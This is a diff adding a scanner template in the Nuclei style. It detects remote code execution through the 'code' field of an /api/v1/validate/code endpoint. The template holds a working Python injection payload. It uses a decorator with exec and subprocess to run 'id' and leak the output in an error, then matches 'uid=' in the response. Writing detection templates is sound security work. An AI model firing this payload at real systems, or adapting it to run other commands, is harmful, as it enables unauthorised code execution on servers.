@@ -1,0 +1,28 @@
+id: code-validator-rce
+
+info:
+  name: Remote Code Execution in /api/v1/validate/code
+  author: floyd
+  severity: high
+  description: |
+    This template detects remote code execution via the `code` field in the `/api/v1/validate/code` endpoint.
+  tags: rce,api
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/v1/validate/code"
+
+    headers:
+      Content-Type: application/json
+
+    body: |
+      {
+        "code": "@exec(\"raise Exception(__import__('subprocess').check_output(['id']).decode())\")\ndef foo():\n  pass"
+      }
+
+    matchers:
+      - type: word
+        words:
+          - "uid="  # Output from 'id' command
+        part: body
